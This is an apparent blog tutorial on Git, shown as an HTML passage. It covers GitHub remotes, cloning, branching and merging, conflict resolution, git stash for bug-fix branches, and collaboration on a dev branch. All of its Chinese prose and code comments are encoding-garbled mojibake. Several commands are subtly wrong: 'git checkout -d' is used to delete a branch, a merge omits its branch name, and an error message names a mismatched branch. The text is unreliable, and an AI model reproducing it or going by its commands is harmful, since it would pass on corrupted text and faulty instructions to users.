<p>æœ€åå‹æƒ…æç¤ºï¼Œåœ¨GitHubä¸Šå…è´¹æ‰˜ç®¡çš„Gitä»“åº“ï¼Œä»»ä½•äººéƒ½å¯ä»¥çœ‹åˆ°å–”ï¼ˆä½†åªæœ‰ä½ è‡ªå·±æ‰èƒ½æ”¹ï¼‰ã€‚æ‰€ä»¥ï¼Œä¸è¦æŠŠæ•æ„Ÿä¿¡æ¯æ”¾è¿›å»ã€‚</p>
<p>å¦‚æœä½ ä¸æƒ³è®©åˆ«äººçœ‹åˆ°Gitåº“ï¼Œæœ‰ä¸¤ä¸ªåŠæ³•ï¼Œä¸€ä¸ªæ˜¯äº¤ç‚¹ä¿æŠ¤è´¹ï¼Œè®©GitHubæŠŠå…¬å¼€çš„ä»“åº“å˜æˆç§æœ‰çš„ï¼Œè¿™æ ·åˆ«äººå°±çœ‹ä¸è§äº†ï¼ˆä¸å¯è¯»æ›´ä¸å¯å†™ï¼‰ã€‚å¦ä¸€ä¸ªåŠæ³•æ˜¯è‡ªå·±åŠ¨æ‰‹ï¼Œæ­ä¸€ä¸ªGitæœåŠ¡å™¨ï¼Œå› ä¸ºæ˜¯ä½ è‡ªå·±çš„GitæœåŠ¡å™¨ï¼Œæ‰€ä»¥åˆ«äººä¹Ÿæ˜¯çœ‹ä¸è§çš„ã€‚è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬åé¢ä¼šè®²åˆ°çš„ï¼Œç›¸å½“ç®€å•ï¼Œå…¬å¸å†…éƒ¨å¼€å‘å¿…å¤‡ã€‚</p>
<p>ç¡®ä¿ä½ æ‹¥æœ‰ä¸€ä¸ªGitHubè´¦å·åï¼Œæˆ‘ä»¬å°±å³å°†å¼€å§‹è¿œç¨‹ä»“åº“çš„å­¦ä¹ ã€‚</p>
<h5 id="æ·»åŠ è¿œç¨‹åº“"><a href="#æ·»åŠ è¿œç¨‹åº“" class="headerlink" title="æ·»åŠ è¿œç¨‹åº“"></a>æ·»åŠ è¿œç¨‹åº“</h5><p>ç°åœ¨ä½ éœ€è¦ç™»å½•è‡ªå·±çš„githubåœ¨å³ä¸Šè§’æ‰¾åˆ°â€œCreate a new repoâ€œ åˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œåˆ›å»ºå®Œæˆåå¤åˆ¶ä»“åº“çš„åœ°å€,å›åˆ°æœ¬åœ°çš„lear-gitæ–‡ä»¶å¤¹(å°±æ˜¯ä½ æœ¬åœ°ä»“åº“çš„æ–‡ä»¶å¤¹)ï¼ŒæŠŠè¿™ä¸¤ä¸ªä»“åº“å…³è”å¹¶æŠŠæœ¬åœ°çš„æ–‡ä»¶pushä¸Šå»ï¼š</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…³è”ä¸¤ä¸ªä»“åº“</span></span><br><span class="line">$ git remote add origin git@github.com:aeexxxz/git_cacatest.git </span><br><span class="line"><span class="comment"># å°†æœ¬åœ°æ–‡ä»¶pushåˆ°è¿œç¨‹ä»“åº“</span></span><br><span class="line">$ git push -u origin <span class="keyword">master</span></span><br><span class="line"><span class="title"># æŠŠæœ¬åœ°ä»“åº“çš„å†…å®¹æ¨åˆ°è¿œç¨‹ç”¨git</span> pushå‘½ä»¤ å®é™…ä¸Šæ˜¯æŠŠ<span class="literal">master</span>åˆ†æ”¯æ¨é€åˆ°äº†è¿œç¨‹</span><br><span class="line"><span class="comment"># ç¬¬ä¸€æ¬¡æ¨é€æ—¶è®°å¾—åŠ ä¸Š -u è¿™æ · gitä¸ä»…ä¼šæ¨é€masteråˆ°è¿œç¨‹ï¼Œè¿˜ä¼šæŠŠæœ¬åœ°masteråˆ†æ”¯å’Œè¿œç¨‹masteråˆ†æ”¯å…³è”èµ·æ¥ã€‚è¿™æ ·ä»¥åæ¨é€çš„æ—¶å€™å°±å¯ä»¥ç®€åŒ–å‘½ä»¤äº†ã€‚</span></span><br></pre></td></tr></table></figure>

<h5 id="ä»è¿œç¨‹åº“å…‹éš†"><a href="#ä»è¿œç¨‹åº“å…‹éš†" class="headerlink" title="ä»è¿œç¨‹åº“å…‹éš†"></a>ä»è¿œç¨‹åº“å…‹éš†</h5><p>ç”Ÿæ´»ä¸­å¤§å¤šæ•°æƒ…å†µæ˜¯æˆ‘ä»¬ä»é›¶å¼€å§‹å°±å·²ç»å‡†å¤‡ä½¿ç”¨githubä»“åº“ï¼Œè¿™æ—¶å€™æˆ‘ä»¬è‚¯å®šå…ˆåˆ›å»ºè¿œç¨‹ä»“åº“ï¼Œç„¶åæ‹‰å–åˆ°æœ¬åœ°ï¼Œè€Œä¸æ˜¯ä»æœ¬åœ°ä»“åº“å†ä¸Šä¼ åˆ°è¿œç¨‹ä»“åº“ã€‚</p>
<p>åˆ›å»ºçš„githubä»“åº“çš„æ­¥éª¤å’Œä¸Šé¢æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬æœ€åä»…ä»…éœ€è¦æ‰¾ä¸ªåˆé€‚çš„åœ°æ–¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> åœ°å€</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæœ‰å¤šä¸ªäººåä½œå¼€å‘ï¼Œé‚£ä¹ˆæ¯ä¸ªäººå„è‡ªä»è¿œç¨‹å…‹éš†ä¸€ä»½å°±å¯ä»¥äº†ã€‚</p>
<p>æ­¤å¤–æˆ‘ä»¬è¿˜å‘ç°äº†gitä¹Ÿæ”¯æŒhttps ä½†æ˜¯httpsé€Ÿåº¦æ…¢ï¼Œè€Œä¸”å¿…é¡»è¦æ¯æ¬¡æ¨é€è¾“å…¥å£ä»¤ï¼Œè¿™ç§å°±å¾ˆéº»çƒ¦ï¼Œé™¤éå†å…¬å¸å†…éƒ¨åªå¼€æ”¾httpçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œå…¶ä»–æƒ…å†µä¸‹æˆ‘ä»¬æ›´å¤šçš„ç”¨ ssh</p>
<h3 id="åˆ†æ”¯ç®¡ç†"><a href="#åˆ†æ”¯ç®¡ç†" class="headerlink" title="åˆ†æ”¯ç®¡ç†"></a>åˆ†æ”¯ç®¡ç†</h3><p>ä¸ºä»€ä¹ˆä¼šæœ‰åˆ†æ”¯ï¼Ÿ</p>
<p>æˆ‘ä»¬ä¸Šçº¿äº†ä¸€ä¸ªç‰ˆæœ¬ï¼Œç„¶åæˆ‘ä»¬ç°åœ¨è¦å¼€å‘ä¸‹ä¸€ä¸ªç‰ˆæœ¬ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåˆ†æ”¯è¿›è¡Œå¼€å‘ï¼Œç„¶åå¿½ç„¶å®¢æˆ·è¯´ä¸Šçº¿çš„ç¯å¢ƒæœ‰bugï¼Œé‚£æˆ‘ä»¬å¯ä»¥åœ¨ä¸Šçº¿ç‰ˆæœ¬ä¸Šå†æä¸€ä¸ªåˆ†æ”¯å‡ºæ¥å»ä¿®å¤bugï¼Œè¿™æ ·äº’ä¸è€½è¯¯ï¼Œæ”¹bugã€å¼€æ”¾æ–°ç‰ˆæœ¬ã€æ·»åŠ æ–°éœ€æ±‚å¯ä»¥åŒæ­¥è¿›è¡Œï¼Œæœ€åä¸Šçº¿çš„æ—¶å€™å†æ ¹æ®éœ€è¦ç»Ÿä¸€åˆå¹¶ã€‚</p>
<p>ä¸ºä»€ä¹ˆgitåˆ›å»ºã€åˆ é™¤ã€åˆ‡æ¢åˆ†æ”¯éƒ½èƒ½åœ¨ä¸€ç§’å†…å®Œæˆï¼Ÿ</p>
<p>å› ä¸ºgitçš„åˆ†æ”¯æ˜¯é€šè¿‡æ”¹å˜æŒ‡é’ˆçš„æŒ‡å‘æ¥å®Œæˆï¼Œæ— è®ºä½ çš„åˆ†æ”¯æœ‰å¤šå°‘æ–‡ä»¶ï¼Œå¯¹gitæ¥è¯´ï¼Œå®ƒåªæ˜¯æŠŠæŒ‡å‘å…¶ä»–åˆ†æ”¯çš„æŒ‡é’ˆé‡æ–°æŒ‡å‘masteråˆ†æ”¯ã€‚</p>
<h5 id="åˆ›å»ºå’Œåˆå¹¶åˆ†æ”¯"><a href="#åˆ›å»ºå’Œåˆå¹¶åˆ†æ”¯" class="headerlink" title="åˆ›å»ºå’Œåˆå¹¶åˆ†æ”¯"></a>åˆ›å»ºå’Œåˆå¹¶åˆ†æ”¯</h5><p>gité‡Œä¸»åˆ†æ”¯æ˜¯masterï¼ŒheadæŒ‡å‘master,åˆ‡æ¢åˆ†æ”¯æ—¶headæŒ‡å‘å¯¹åº”åˆ†æ”¯ï¼Œæˆ‘ä»¬çš„å·¥ä½œåˆ†æ”¯å°±æ˜¯headæ‰€æŒ‡å‘çš„åˆ†æ”¯ã€‚</p>
<p>åˆ›å»ºåˆ†æ”¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git checkout -b dev <span class="comment">#åˆ›å»ºå¹¶åˆ‡æ¢åˆ°devåˆ†æ”¯,åŠŸèƒ½ç­‰åŒäºä¸‹é¢ä¸¤æ¡å‘½ä»¤</span></span><br><span class="line">$ git branch dev <span class="comment">#åˆ›å»ºdev</span></span><br><span class="line">$ git checkout dev <span class="comment">#åˆ‡æ¢åˆ°devåˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒæ—¶ä¸ºäº†æ›´å¥½è®°å¿†æ–°ç‰ˆgitæ·»åŠ äº†switchå‘½ä»¤è¿›è¡Œåˆ‡æ¢</span></span><br><span class="line">git switch -c name <span class="comment">#åˆ›å»ºå¹¶åˆ‡æ¢åˆ°nameåˆ†æ”¯</span></span><br><span class="line">$ git switch &lt;name&gt; <span class="comment">#åˆ‡æ¢åˆ†æ”¯</span></span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹å½“å‰åˆ†æ”¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br></pre></td></tr></table></figure>
<p>åˆå¹¶åˆ†æ”¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git merge åˆ†æ”¯åç§°</span><br></pre></td></tr></table></figure>
<p>åˆ é™¤åºŸå¼ƒçš„åˆ†æ”¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch -d dev</span><br></pre></td></tr></table></figure>

<h5 id="è§£å†³å†²çª"><a href="#è§£å†³å†²çª" class="headerlink" title="è§£å†³å†²çª"></a>è§£å†³å†²çª</h5><p>å¦‚æœä¸¤ä¸ªæ–‡ä»¶åç›¸åŒå†…å®¹ä¸åŒä¸”éƒ½åœ¨å½“å‰èŠ‚ç‚¹æäº¤ï¼Œå°±ä¼šå˜æˆè¿™æ ·ï¼š<br><img data-src="C:\Users\ThinkPadã€\AppData\Roaming\Typora\typora-user-images\1575622688980.png" alt="1575622688980"></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬è¿›è¡Œ git merge+åˆ†æ”¯åç§° ä¼šæç¤ºå†²çªå› ä¸ºç›¸åŒæ–‡ä»¶æœ‰ä¸åŒçš„å†…å®¹ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ä¿®æ”¹å¯¹åº”æ–‡ä»¶ å¹¶å†æ¬¡ git add git commit ç„¶åæ‰å¯ä»¥åˆå¹¶æˆåŠŸ</p>
<h5 id="åˆ†æ”¯ç®¡ç†-1"><a href="#åˆ†æ”¯ç®¡ç†-1" class="headerlink" title="åˆ†æ”¯ç®¡ç†"></a>åˆ†æ”¯ç®¡ç†</h5><p>git merge  å‘½ä»¤ é»˜è®¤ä½¿ç”¨çš„æ˜¯fast-forwardæ¨¡å¼ï¼Œæ­¤æ¨¡å¼ä¸‹åˆ æ‰åˆ†æ”¯åï¼Œä¼šä¸¢æ‰åˆ†æ”¯çš„ä¿¡æ¯ã€‚æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦åˆå¹¶åä¿ç•™åˆ†æ”¯ä¸­çš„ä¿¡æ¯æ–¹ä¾¿æˆ‘ä»¬åšä»£ç å˜åŠ¨çš„å®¡æŸ¥ï¼Œäºæ˜¯å°±æœ‰äº†å¼ºåˆ¶å…³é—­Fast forwardæ¨¡å¼çš„åˆå¹¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> checkout -b dev</span><br><span class="line"><span class="variable">$git</span> add readme.txt</span><br><span class="line"><span class="variable">$git</span> commit -m <span class="string">&quot;modify readme.txt&quot;</span></span><br><span class="line"><span class="variable">$git</span> checkout master</span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> merge --no-ff -m <span class="string">&quot;merge with no-ff&quot;</span> dev</span><br><span class="line"><span class="variable">$git</span> <span class="built_in">log</span> --graph --pretty=oneline --abbrev-commit        <span class="comment">#æŸ¥çœ‹åˆ†æ”¯ä¿¡æ¯</span></span><br><span class="line"><span class="comment">#è¿™æ¬¡åˆå¹¶ååˆ›å»ºäº†ä¸€ä¸ªæ–°çš„commitï¼Œè¿™ç§åˆå¹¶åä½¿ç”¨ git logæŸ¥çœ‹åˆ†æ”¯å†å²å¯ä»¥çœ‹åˆ°åˆ†æ”¯çš„ä¿¡æ¯</span></span><br><span class="line"><span class="comment">#åˆå¹¶åˆ†æ”¯æ—¶ï¼ŒåŠ ä¸Š--no-ffå‚æ•°å°±å¯ä»¥ç”¨æ™®é€šæ¨¡å¼åˆå¹¶ï¼Œåˆå¹¶åçš„å†å²æœ‰åˆ†æ”¯ï¼Œèƒ½çœ‹å‡ºæ¥æ›¾ç»åšè¿‡åˆå¹¶ï¼Œè€Œfast forwardåˆå¹¶å°±çœ‹ä¸å‡ºæ¥æ›¾ç»åšè¿‡åˆå¹¶ã€‚</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åœ¨å®é™…å¼€å‘ä¸­åº”è¯¥è¿™æ ·åˆç†åˆ†é…åˆ©ç”¨åˆ†æ”¯ã€‚<br>1ã€é¦–å…ˆmasteråˆ†æ”¯æ˜¯éå¸¸ç¨³å®šçš„ï¼Œä»…ä»…ç”¨æ¥å‘å¸ƒæ–°ç‰ˆæœ¬ã€‚<br>2ã€å¹²æ´»å„¿åœ¨devåˆ†æ”¯ä¸Šï¼Œç­‰æµ‹è¯•æ²¡é—®é¢˜äº†å†åˆå¹¶åˆ°masteråˆ†æ”¯ã€‚<br>3ã€æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„åˆ†æ”¯ï¼Œæ˜¯ä¸æ˜¯çš„å¾€devåˆ†æ”¯ä¸Šåˆå¹¶å°±å¯ä»¥äº†ã€‚</p>
<p>å€Ÿç”¨å»–è€å¸ˆçš„ä¸€å¼ å›¾ï¼ŒçœŸæ­£çš„å¼€å‘åº”è¯¥æ˜¯è¿™æ ·</p>
<p><img data-src="https://www.liaoxuefeng.com/files/attachments/919023260793600/0" alt="git-br-policy"></p>
<h5 id="BUGåˆ†æ”¯"><a href="#BUGåˆ†æ”¯" class="headerlink" title="BUGåˆ†æ”¯"></a>BUGåˆ†æ”¯</h5><p>bugæ°¸è¿œå­˜åœ¨ï¼Œæ— è®ºä½ çš„ç»„å¤§ä½¬æœ‰å¤šå°‘ï¼Œbugæ°¸è¿œå­˜åœ¨ã€‚gitåˆ†æ”¯è®©bugä¿®å¤æ›´æ–¹ä¾¿ã€‚</p>
<p>æˆ‘æ˜¯bobç°åœ¨æˆ‘æ­£åœ¨bobåˆ†æ”¯ä¸Šå¼€å‘ï¼Œä½†æ˜¯é¢†å¯¼çªç„¶é€šçŸ¥æœ‰bugé©¬ä¸Šè®©æˆ‘å»ä¿®å¤ï¼Œä½†æ˜¯æˆ‘çš„æœ¬åœ°çš„å·¥ä½œè¿˜æ²¡æœ‰æå®Œï¼Œåªå†™äº†ä¸€åŠï¼Œä¹Ÿæ— æ³•æäº¤ï¼ˆcommitï¼‰ã€‚æ‰€ä»¥æˆ‘åªèƒ½å…ˆæŠŠå½“å‰å·¥ä½œåŒºå­˜å‚¨èµ·æ¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> status    <span class="comment">#æŸ¥çœ‹å½“å‰å·¥ä½œåŒºæ˜¯å¦æœ‰æœªæäº¤çš„ï¼Œå¦‚æœæ²¡æœ‰å°±ä¸ç”¨ä¿å­˜å½“å‰å·¥ä½œåŒºäº†</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ‡è®°æ²¡æœ‰è¿›å…¥gitç‰ˆæœ¬æ§åˆ¶ä¸­çš„æ–‡ä»¶æ˜¯ä¸èƒ½è¢«git stash å­˜èµ·æ¥çš„ æ‰€ä»¥æœ‰äº›åæ¥æ·»åŠ çš„æ–‡ä»¶ï¼Œæ²¡æœ‰æ¥å¾—åŠaddåˆ°gitç‰ˆæœ¬æ§åˆ¶ å°±ä¸ä¼šè¢«git stashå­˜å‚¨èµ·æ¥ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> stash        <span class="comment">#git stash ä¿å­˜å½“å‰å·¥ä½œåŒºå’Œæš‚å­˜åŒºè¿›åº¦ï¼Œå›é€€åˆ°ä¸Šä¸€ä¸ª git commit ä¹‹åçš„çŠ¶æ€</span></span><br><span class="line"><span class="variable">$git</span> stash list   <span class="comment"># æŸ¥çœ‹å­˜å‚¨è¿‡çš„å·¥ä½œåŒºåˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¼šæœ‰äººé—®ï¼Œä¸ºä»€ä¹ˆæˆ‘åˆ›å»ºçš„æ¯”å¦‚3.txtæ²¡æœ‰åŠ å…¥ç‰ˆæœ¬æ§åˆ¶å™¨ï¼Œå®ƒå°±æ— æ³•è¢«ä¿å­˜ï¼Œé‚£æ­¤æ—¶çš„git stashå¹¶ä¸æ˜¯å®Œå…¨ä¿å­˜äº†æˆ‘ç°åœ¨çš„å·¥ä½œåŒºï¼Œä»–æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</p>
<p>æ˜¯è¿™æ ·çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬ä¿®æ”¹äº†ä¸€ä¸ªå·²ç»å­˜åœ¨ åœ¨ gitç‰ˆæœ¬æ§åˆ¶çš„æ–‡ä»¶æ¯”å¦‚readme.txt ä½†æ­¤æ—¶æˆ‘ä»¬è¿˜æœªæäº¤ï¼Œå¦‚æœæ­¤æ—¶æˆ‘ä»¬åˆ‡æ¢åˆ°masterï¼Œé‚£ä¹ˆä¿®æ”¹å†…å®¹ä¹Ÿä¼šåœ¨masteråˆ†æ”¯çš„reandmeå‡ºç°ï¼Œè€Œå¦‚æœæˆ‘ä»¬git stash æš‚å­˜å½“å‰çš„å·¥ä½œåŒºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šå›åˆ°ä¸Šä¸€æ¬¡commitçš„ç‚¹ä¸Šï¼Œå†åˆ‡æ¢åˆ°masteråï¼Œæˆ‘ä»¬çš„å·¥ä½œåŒºçš„å†…å®¹ä¸ä¼šå¯¹masteråˆ†æ”¯çš„å·¥ä½œå»é€ æˆä»»ä½•å½±å“ã€‚æˆ‘ä»¬å°±å¯ä»¥æ›´æ–¹ä¾¿çš„è¿›è¡Œmasterçš„æ“ä½œã€‚ç»“æŸå æˆ‘ä»¬å›åˆ°è‡ªå·±çš„åˆ†åªè¿›è¡Œ git stash pop æ¢å¤ æ‰€æœ‰çš„gitç‰ˆæœ¬æ§åˆ¶ä¸­çš„ä¿®æ”¹å°±éƒ½ä¼šè¿˜åŸï¼Œè‡³äºé‚£äº›ä¸åœ¨gitç‰ˆæœ¬æ§åˆ¶ä¸­çš„æ–‡ä»¶ï¼Œä»–æ°¸è¿œéƒ½åœ¨å·¥ä½œåŒºï¼Œæ—¢å­˜åœ¨äºmasteråˆ†æ”¯ä¹Ÿå­˜åœ¨ä¸æˆ‘ä»¬è‡ªå·±çš„å¼€å‘åˆ†æ”¯ï¼Œåªæœ‰æœ‰äººæŠŠä»–git add è¿›è¡Œæäº¤æ—¶ï¼Œå®ƒæ‰å½’å…¥ç‰ˆæœ¬æ§åˆ¶åº“ï¼Œç‹¬å±äºæŸä¸€åˆ†æ”¯ã€‚</p>
<p>æ‰€ä»¥git stashåœ¨ä¿®å¤bugã€åˆ‡æ¢åˆ†æ”¯æ—¶è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚</p>
<p>ç„¶åæˆ‘ä»¬åˆ‡æ¢åˆ°masteråˆ†æ”¯å»ä¿®bug</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> checkout master</span><br><span class="line"><span class="variable">$git</span> checkout -b issue-01 <span class="comment">#åˆ›å»ºbugåˆ†æ”¯</span></span><br><span class="line"><span class="comment">#ä¿®å¤å®Œæˆåadd commit å¹¶åˆ‡æ¢masteråˆ†æ”¯åˆå¹¶</span></span><br><span class="line"><span class="variable">$git</span> checkout master</span><br><span class="line"><span class="variable">$git</span> merge --no-ff -m <span class="string">&quot;merge bug fix 01&quot;</span></span><br><span class="line"><span class="variable">$git</span> checkout -d issue-01 <span class="comment">#åˆå¹¶ååˆ é™¤bugåˆ†æ”¯</span></span><br><span class="line"><span class="comment">#åˆ‡æ¢å›å·¥ä½œåŒº</span></span><br><span class="line"><span class="variable">$git</span> checkout test_bob</span><br><span class="line"><span class="variable">$git</span> stash list <span class="comment">#æŸ¥çœ‹å·¥ä½œç°åœº</span></span><br><span class="line"><span class="variable">$git</span> stash pop  <span class="comment">#æ¢å¤å·¥ä½œå¹¶åˆ é™¤å­˜å‚¨çš„å·¥ä½œç°åœºåˆ—è¡¨</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†ä¸€æ¬¡bugä¿®å¤ã€‚</p>
<h5 id="Featureåˆ†æ”¯"><a href="#Featureåˆ†æ”¯" class="headerlink" title="Featureåˆ†æ”¯"></a>Featureåˆ†æ”¯</h5><p>æŸå¤©å®¢æˆ·å¿ƒè¡€æ¥æ½®ï¼Œè¯´è¦åŠ ä¸€ä¸ªå¯ä»¥è‡ªåŠ¨è¯†åˆ«æ˜¯äººåœ¨ç©å„¿æ‰‹æœºè¿˜æ˜¯ç‹—åœ¨ç©å„¿æ‰‹æœºçš„åŠŸèƒ½ã€‚è™½ç„¶ä½ è§‰å¾—å¾ˆä¸é è°±ä¸”åŠŸèƒ½éƒ½å¼€å‘çš„å·®ä¸å¤šäº†ï¼Œä½†æ˜¯å®¢æˆ·å°±æ˜¯ä¸Šå¸ï¼Œä½ è¿˜æ˜¯éœ€è¦å¢åŠ ä¸€ä¸ªéœ€æ±‚ã€‚</p>
<p>ä¸ºäº†ä¸è®©æ–°åŠŸèƒ½æŠŠæˆ‘ä»¬å·²ç»å¼€å‘å¥½çš„ä»£ç æ‰“ä¹±ï¼Œæˆ‘ä»¬ä»å½“å‰çš„devåˆ†æ”¯æ–°å»ºä¸€ä¸ªfeatureåˆ†æ”¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> checkout -b feature-person-or-dog</span><br><span class="line"><span class="variable">$git</span> add person-or-dog.py</span><br><span class="line"><span class="variable">$git</span> commit -m <span class="string">&quot;å¼€å‘å®Œæ¯•ï¼Œæœ€åä¸€ä¸ªåŠŸèƒ½æäº¤&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æäº¤å®Œåˆ‡å›devåˆ†æ”¯è¿›è¡Œä»£ç åˆå¹¶</span></span><br><span class="line"><span class="variable">$git</span> checkout dev</span><br><span class="line"><span class="variable">$git</span> merge --no-ff -m <span class="string">&quot;åˆå¹¶æ–°åŠŸèƒ½&quot;</span> feature-person-or-dog</span><br><span class="line"><span class="variable">$git</span> branch -d feature-person-or-dog</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¦‚æœåœ¨ä¸Šä¸€æ­¥æäº¤ä¹‹å‰è¿™æ—¶å€™çªç„¶æœ‰ä¸€ä¸ªæ’æ›²ï¼Œå®¢æˆ·åˆä¸è¦è¿™ä¸ªåŠŸèƒ½äº†ï¼Œè§‰å¾—è¿™ä¸ªåŠŸèƒ½å¤ªæ‰¯ï¼Œæˆ‘ä»¬å°±åº”è¯¥åˆ é™¤è¿™ä¸ªåˆ†æ”¯ï¼Œé˜²æ­¢åˆ«äººçŸ¥é“æˆ‘ä»¬å¼€å‘äº†è¿™ä¹ˆçæ‰¯çš„ä¸€ä¸ªåŠŸèƒ½ã€‚</span></span><br><span class="line">$ git branch -d feature-person-or-dog</span><br><span class="line">error: The branch <span class="string">&#x27;person-or-dog&#x27;</span> is not fully merged.</span><br><span class="line">If you are sure you want to delete it, run <span class="string">&#x27;git branch -D person-or-dog&#x27;</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸Šé¢çš„é”™è¯¯å°±æ˜¯å¦‚æœä¸€ä¸ªåˆ†æ”¯æœªè¢«åˆå¹¶æ˜¯ä¸èƒ½è¢«åˆ é™¤çš„ï¼Œåªèƒ½å¼ºåˆ¶åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦-Då‚æ•°è¿›è¡Œåˆ é™¤</span></span><br><span class="line"></span><br><span class="line">$ git branch -D feature-person-or-dog</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="å¤šäººåä½œ"><a href="#å¤šäººåä½œ" class="headerlink" title="å¤šäººåä½œ"></a>å¤šäººåä½œ</h5><p>å½“ä½ ä»è¿œç¨‹ä»“åº“å…‹éš†æ—¶ï¼Œå®é™…ä¸Šgitè‡ªåŠ¨æŠŠæœ¬åœ°çš„masteråˆ†æ”¯å’Œè¿œç¨‹çš„masteråˆ†æ”¯å¯¹åº”èµ·æ¥äº†ï¼Œå¹¶ä¸”è¿œç¨‹ä»“åº“é»˜è®¤åç§°å°±æ˜¯originã€‚</p>
<p>è¦æŸ¥çœ‹è¿œç¨‹ä»“åº“çš„ä¿¡æ¯ï¼š<code> $git remote</code> æˆ–è€…ä½¿ç”¨ Â·<code>$git remote -v</code>æŸ¥çœ‹æ›´è¯¦ç»†ä¿¡æ¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:michaelliao/learngit.git (fetch)</span><br><span class="line">origin  git@github.com:michaelliao/learngit.git (push)</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢æ˜¾ç¤ºäº†å¯ä»¥æŠ“å–å’Œæ¨é€çš„originåœ°å€ã€‚å¦‚æœæ²¡æœ‰æ¨é€æƒé™ï¼Œå°±çœ‹ä¸åˆ°pushçš„åœ°å€ã€‚</p>
<p>æˆ‘ä»¬æœ‰æ—¶å€™å»ºç«‹äº†è‡ªå·±çš„åˆ†æ”¯ï¼Œè€Œè¿™ä¸ªåˆ†æ”¯è¿œç¨‹åº“æ²¡æœ‰ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦è‡ªå·±æ¨é€åˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> push origin dev</span><br></pre></td></tr></table></figure>
<p>ä»€ä¹ˆåˆ†æ”¯æ˜¯é€‚åˆæ¨é€çš„å‘¢ï¼š</p>
<ul>
<li><p>masteråˆ†æ”¯æ˜¯ä¸»åˆ†æ”¯ï¼Œå› æ­¤è¦æ—¶åˆ»ä¸è¿œç¨‹åŒæ­¥ï¼›</p>
</li>
<li><p>devåˆ†æ”¯æ˜¯å¼€å‘åˆ†æ”¯ï¼Œå›¢é˜Ÿæ‰€æœ‰æˆå‘˜éƒ½éœ€è¦åœ¨ä¸Šé¢å·¥ä½œï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦ä¸è¿œç¨‹åŒæ­¥ï¼›</p>
</li>
<li><p>bugåˆ†æ”¯åªç”¨äºåœ¨æœ¬åœ°ä¿®å¤bugï¼Œå°±æ²¡å¿…è¦æ¨åˆ°è¿œç¨‹äº†ï¼Œé™¤éè€æ¿è¦çœ‹çœ‹ä½ æ¯å‘¨åˆ°åº•ä¿®å¤äº†å‡ ä¸ªbugï¼›</p>
</li>
<li><p>featureåˆ†æ”¯æ˜¯å¦æ¨åˆ°è¿œç¨‹ï¼Œå–å†³äºä½ æ˜¯å¦å’Œä½ çš„å°ä¼™ä¼´åˆä½œåœ¨ä¸Šé¢å¼€å‘ã€‚</p>
</li>
</ul>
<p>æ–°åŠ å…¥çš„å°ä¼™ä¼´æ€ä¹ˆå¼€å‘ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> <span class="built_in">clone</span>  git@github.com:geeeez/git_test.git</span><br><span class="line"><span class="comment">#å…‹éš†å®Œæˆå git branchåªèƒ½çœ‹åˆ°masteråˆ†æ”¯ï¼Œé‚£å°ä¼™ä¼´ä¹Ÿæƒ³åœ¨devåˆ†æ”¯å¼€å‘ã€‚</span></span><br><span class="line"><span class="comment">#åªéœ€è¦åˆ›å»ºä¸€ä¸ªæœ¬åœ°devåˆ†æ”¯ï¼Œ</span></span><br><span class="line"></span><br><span class="line">$ git checkout -b dev origin/dev</span><br><span class="line"><span class="comment">#ç„¶ååœ¨devä¸Šç»§ç»­ä¿®æ”¹ï¼Œæ—¶ä¸æ—¶çš„æŠŠdevpushåˆ°è¿œç¨‹</span></span><br><span class="line"><span 